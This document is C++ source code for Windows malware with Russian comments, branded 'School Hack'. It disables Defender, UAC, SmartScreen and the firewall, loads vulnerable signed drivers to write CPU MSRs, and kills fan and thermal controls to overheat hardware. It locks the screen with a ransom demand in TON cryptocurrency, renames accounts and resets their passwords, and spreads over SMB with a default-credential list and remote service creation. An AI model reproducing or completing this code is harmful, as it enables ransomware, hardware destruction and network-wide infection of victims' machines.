#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <lm.h>
#include <intrin.h>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <fstream>
#include <iostream>
#include <string>
#include "config.h"
#include "byovd.h"

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")

// ============ УТИЛИТЫ ============
std::wstring ExePath() {
    wchar_t b[MAX_PATH];
    GetModuleFileNameW(nullptr, b, MAX_PATH);
    return b;
}
bool IsSource() {
    return GetFileAttributesW(MARKER_PATH) != INVALID_FILE_ATTRIBUTES;
}
bool EnablePriv(const wchar_t* n) {
    HANDLE t;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &t)) return false;
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValueW(nullptr, n, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool ok = AdjustTokenPrivileges(t, FALSE, &tp, sizeof(tp), nullptr, nullptr) != 0;
    CloseHandle(t);
    return ok;
}
void RunHidden(const std::wstring& args) {
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    std::wstring cmd = L"cmd.exe /c " + args + L" >nul 2>&1";
    if (CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 3000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// ============ СНЯТИЕ ЗАЩИТ ============
void KillDefenderAndUAC() {
    auto SetDw = [](const wchar_t* path, const wchar_t* name, DWORD val) {
        HKEY hk;
        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, path, 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
            RegSetValueExW(hk, name, 0, REG_DWORD, (BYTE*)&val, sizeof(val));
            RegCloseKey(hk);
        }
    };
    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiSpyware", 1);
    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiVirus", 1);
    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", L"DisableRealtimeMonitoring", 1);
    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", L"DisableBehaviorMonitoring", 1);
    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", L"DisableOnAccessProtection", 1);
    SetDw(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"EnableLUA", 0);
    SetDw(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"ConsentPromptBehaviorAdmin", 0);
    SetDw(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"PromptOnSecureDesktop", 0);
    SetDw(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", L"SmartScreenEnabled", 0);
    SetDw(L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", L"EnableFirewall", 0);
    SetDw(L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", L"EnableFirewall", 0);
    RunHidden(L"sc stop WinDefend");
    RunHidden(L"sc config WinDefend start= disabled");
}

// ============ BURNER ============
std::atomic<bool> g_run{ true };

void DisableWindowsThermal() {
    RunHidden(L"powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100");
    RunHidden(L"powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 100");
    RunHidden(L"powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMAX 100");
    RunHidden(L"powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR PROCTHROTTLEMIN 100");
    RunHidden(L"powercfg /setacvalueindex SCHEME_CURRENT SUB_PROCESSOR SYSCOOLPOL 0");
    RunHidden(L"powercfg /setdcvalueindex SCHEME_CURRENT SUB_PROCESSOR SYSCOOLPOL 0");
    RunHidden(L"powercfg /setactive SCHEME_CURRENT");

    HKEY hk;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Thermal\\Global\\Policy",
        0, nullptr, 0, KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
        DWORD z = 0;
        RegSetValueExW(hk, L"ThermalThrottleEnabled", 0, REG_DWORD, (BYTE*)&z, 4);
        RegSetValueExW(hk, L"PassiveCooling", 0, REG_DWORD, (BYTE*)&z, 4);
        RegCloseKey(hk);
    }
}

void KillVendorFans() {
    const wchar_t* svcs[] = {
        L"LenovoVantageService", L"DellCommandUpdate", L"HPWMISVC",
        L"AsusUpdateCheck", L"ArmouryCrateControlInterface",
        L"MSICommandCenter", L"NvGpuFanControl",
        L"Intel(R) Dynamic Platform and Thermal Framework"
    };
    for (auto* s : svcs) {
        RunHidden(std::wstring(L"sc stop \"") + s + L"\"");
        RunHidden(std::wstring(L"sc config \"") + s + L"\" start= disabled");
    }
}

void BurnCore(int id) {
    SetThreadAffinityMask(GetCurrentThread(), (DWORD_PTR)1 << id);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
    volatile double a = 1.0, b = 1.0000001;
    while (g_run.load()) {
        SetThreadExecutionState(ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED | ES_CONTINUOUS);
        for (int i = 0; i < 2000000; i++) {
            a = a * b + 0.0000001;
            b = b * 1.0000001 - 0.0000001;
            if (a > 1e100) { a = 1.0; b = 1.0000001; }
            _ReadWriteBarrier();
        }
    }
}

void StartBurner() {
    DisableWindowsThermal();
    KillVendorFans();

    // MSR через BYOVD драйверы
    Iqvw iq;
    Gdrv gd;
    if (iq.Open()) {
        iq.WriteMsr(0x1A0, 0, 0);
        iq.WriteMsr(0x1A2, 0, 0);
        iq.WriteMsr(0x199, 0x00001F00, 0);
        iq.WriteMsr(0x1B2, 0, 0);
        iq.WriteMsr(0x19B, 0, 0);
        iq.OutPort(0x404, 0);
        iq.OutPort(0x400, 0x11);
        iq.OutPort(0x402, 0);
        iq.Close();
    } else if (gd.Open()) {
        gd.WriteMsr(0x1A0, 0, 0);
        gd.WriteMsr(0x1A2, 0, 0);
        gd.WriteMsr(0x199, 0x00001F00, 0);
        gd.OutPort(0x404, 0);
        gd.OutPort(0x400, 0x11);
        gd.OutPort(0x402, 0);
        gd.Close();
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    static std::vector<std::thread> threads;
    for (int i = 0; i < (int)si.dwNumberOfProcessors; i++)
        threads.emplace_back(BurnCore, i % si.dwNumberOfProcessors);
}

// ============ LOCKER ============
HHOOK g_hook = nullptr;
LRESULT CALLBACK KbProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        auto* k = (KBDLLHOOKSTRUCT*)lParam;
        bool alt = GetAsyncKeyState(VK_MENU) & 0x8000;
        if (k->vkCode == VK_LWIN || k->vkCode == VK_RWIN ||
            k->vkCode == VK_ESCAPE || k->vkCode == VK_TAB ||
            (k->vkCode == VK_F4 && alt))
            return 1;
    }
    return CallNextHookEx(g_hook, nCode, wParam, lParam);
}
LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        HBRUSH b = CreateSolidBrush(RGB(0,0,0)); FillRect(dc, &rc, b); DeleteObject(b);
        SetBkMode(dc, TRANSPARENT); SetTextColor(dc, RGB(255,0,0));
        HFONT f = CreateFontW(28,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Consolas");
        SelectObject(dc, f);
        std::wstring t = L"ВАШИ КОМПЬЮТЕРЫ ЗАБЛОКИРОВАНЫ ХАКЕРСКОЙ ГРУППИРОВКОЙ SCHOOL HACK\n\n"
                         L"ПЕРЕВОДИ 10 TON НА " + WALLET + L"\n"
                         L"ИЛИ КОМПЬЮТЕР ВЗЛЕТИТ К ХУЯМ.";
        DrawTextW(dc, t.c_str(), -1, &rc, DT_CENTER|DT_VCENTER|DT_WORDBREAK);
        DeleteObject(f); EndPaint(h, &ps); return 0;
    }
    case WM_CLOSE: return 0;
    case WM_SYSCOMMAND: if ((w & 0xFFF0) == SC_CLOSE) return 0; break;
    case WM_TIMER: SetWindowPos(h, HWND_TOPMOST, 0,0,0,0, SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE); return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
void StartLocker(HINSTANCE hInst) {
    ShowCursor(FALSE);
    g_hook = SetWindowsHookExW(WH_KEYBOARD_LL, KbProc, hInst, 0);
    WNDCLASSW wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = L"WinDefendLocker";
    RegisterClassW(&wc);
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    HWND h = CreateWindowExW(WS_EX_TOPMOST|WS_EX_TOOLWINDOW, L"WinDefendLocker", L"",
        WS_POPUP|WS_VISIBLE, 0,0,sw,sh, nullptr,nullptr,hInst,nullptr);
    SetTimer(h, 1, 100, nullptr);
    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) { TranslateMessage(&msg); DispatchMessageW(&msg); }
}

// ============ WORM ============
bool OpenSess(const std::wstring& ip, const std::wstring& u, const std::wstring& p) {
    NETRESOURCEW nr = {}; nr.dwType = RESOURCETYPE_DISK;
    std::wstring c = L"\\\\" + ip + L"\\C$";
    nr.lpRemoteName = const_cast<LPWSTR>(c.c_str());
    DWORD r = WNetAddConnection2W(&nr, p.c_str(), u.c_str(), 0);
    return r == NO_ERROR || r == ERROR_ALREADY_ASSIGNED;
}
void CloseSess(const std::wstring& ip) {
    WNetCancelConnection2W((L"\\\\" + ip + L"\\C$").c_str(), 0, TRUE);
}
bool RunRemote(const std::wstring& ip) {
    std::wstring s1 = L"cmd.exe /c \"sc \\\\" + ip + L" delete " + SVC_NAME + L" >nul 2>&1\"";
    std::wstring s2 = L"cmd.exe /c \"sc \\\\" + ip + L" create " + SVC_NAME + L" binPath= \\\"C:\\Windows\\Temp\\" + PAYLOAD_NAME + L"\\\" start= auto >nul 2>&1\"";
    std::wstring s3 = L"cmd.exe /c \"sc \\\\" + ip + L" start " + SVC_NAME + L" >nul 2>&1\"";
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    for (auto* c : { &s1, &s2, &s3 }) {
        PROCESS_INFORMATION pi = {};
        if (CreateProcessW(nullptr, c->data(), nullptr, nullptr, FALSE,
                           CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
    }
    return true;
}
std::wstring LocalIP() {
    WSADATA w; if (WSAStartup(MAKEWORD(2,2), &w) != 0) return L"";
    char h[256] = {}; gethostname(h, sizeof(h));
    addrinfo hi = {}, *r = nullptr; hi.ai_family = AF_INET;
    std::wstring out;
    if (getaddrinfo(h, nullptr, &hi, &r) == 0 && r) {
        sockaddr_in* sa = (sockaddr_in*)r->ai_addr;
        wchar_t ip[32]; InetNtopW(AF_INET, &sa->sin_addr, ip, 32); out = ip;
        freeaddrinfo(r);
    }
    WSACleanup(); return out;
}
std::vector<std::wstring> Scan() {
    std::vector<std::wstring> h;
    std::wstring loc = LocalIP();
    if (loc.empty()) return h;
    auto d = loc.find_last_of(L'.');
    if (d == std::wstring::npos) return h;
    std::wstring pre = loc.substr(0, d + 1);
    WSADATA w; if (WSAStartup(MAKEWORD(2,2), &w) != 0) return h;
    for (int i = 1; i < 255; i++) {
        std::wstring ip = pre + std::to_wstring(i);
        if (ip == loc) continue;
        SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in a = {}; a.sin_family = AF_INET; a.sin_port = htons(445);
        InetPtonW(AF_INET, ip.c_str(), &a.sin_addr);
        u_long nb = 1; ioctlsocket(s, FIONBIO, &nb);
        connect(s, (sockaddr*)&a, sizeof(a));
        fd_set f; FD_ZERO(&f); FD_SET(s, &f);
        timeval tv = { 0, 150000 };
        if (select(0, nullptr, &f, nullptr, &tv) > 0) h.push_back(ip);
        closesocket(s);
    }
    WSACleanup(); return h;
}
void Hijack() {
    LPUSER_INFO_0 b = nullptr; DWORD n = 0, t = 0;
    if (NetUserEnum(nullptr, 0, FILTER_NORMAL_ACCOUNT,
        (LPBYTE*)&b, MAX_PREFERRED_LENGTH, &n, &t, nullptr) != NERR_Success) return;
    for (DWORD i = 0; i < n; i++) {
        std::wstring nm = b[i].usri0_name;
        if (_wcsicmp(nm.c_str(), L"Administrator") == 0 ||
            _wcsicmp(nm.c_str(), L"Guest") == 0) continue;
        std::wstring nn = L"SCHOOLhACK_" + std::to_wstring(i + 1);
        USER_INFO_0 ri = {}; ri.usri0_name = const_cast<LPWSTR>(nn.c_str());
        NetUserSetInfo(nullptr, b[i].usri0_name, 0, (LPBYTE)&ri, nullptr);
        USER_INFO_1003 ui = {}; ui.usri1003_password = const_cast<LPWSTR>(NEW_PASSWORD.c_str());
        NetUserSetInfo(nullptr, nn.c_str(), 1003, (LPBYTE)&ui, nullptr);
    }
    NetApiBufferFree(b);
}
void Spread() {
    std::wstring self = ExePath();
    auto hosts = Scan();
    std::vector<std::pair<std::wstring,std::wstring>> creds = {
        { L"Administrator", L"" }, { L"Administrator", L"admin" },
        { L"Administrator", L"password" }, { L"admin", L"admin" },
        { L"admin", L"password" }, { L"user", L"user" },
        { L"student", L"student" }, { L"school", L"school" },
    };
    for (auto& ip : hosts) {
        for (auto& [u, p] : creds) {
            if (!OpenSess(ip, u, p)) continue;
            bool ok = CopyFileW(self.c_str(),
                (L"\\\\" + ip + L"\\C$\\Windows\\Temp\\" + PAYLOAD_NAME).c_str(), FALSE) != 0;
            if (ok) {
                RunRemote(ip);
            }
            CloseSess(ip);
            if (ok) break;
        }
    }
}

// ============ MAIN ============
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    HANDLE mtx = CreateMutexW(nullptr, TRUE, L"Global\\WinDefendUpdater");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    EnablePriv(L"SeDebugPrivilege");
    EnablePriv(L"SeLoadDriverPrivilege");
    EnablePriv(L"SeSystemEnvironmentPrivilege");
    EnablePriv(L"SeTcbPrivilege");

    // 1. Снимаем софт-защиты
    KillDefenderAndUAC();

    // 2. Ставим BYOVD драйверы
    InstallByovd(L"iqvw64e.sys", L"iqvw64e");
    InstallByovd(L"gdrv.sys", L"gdrv");

    HKEY hk;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, REG_RUN_KEY, 0, nullptr, 0,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
        wchar_t self[MAX_PATH];
        GetModuleFileNameW(nullptr, self, MAX_PATH);
        RegSetValueExW(hk, REG_RUN_NAME, 0, REG_SZ,
            (BYTE*)self, (DWORD)((wcslen(self) + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }

    if (IsSource()) {
        std::wstring mp = MARKER_PATH;
        auto slash = mp.find_last_of(L'\\');
        if (slash != std::wstring::npos) {
            typedef int(WINAPI* PFN_SHDIR)(HWND, const wchar_t*, void*);
            HMODULE sh = LoadLibraryW(L"shell32.dll");
            if (sh) {
                auto fn = (PFN_SHDIR)GetProcAddress(sh, "SHCreateDirectoryExW");
                if (fn) fn(nullptr, mp.substr(0, slash).c_str(), nullptr);
                FreeLibrary(sh);
            }
        }
        std::ofstream m(mp.c_str()); m << "src"; m.close();
        Spread();
        return 0;
    }

    Hijack();
    StartBurner();
    StartLocker(hInst);
    return 0;
}
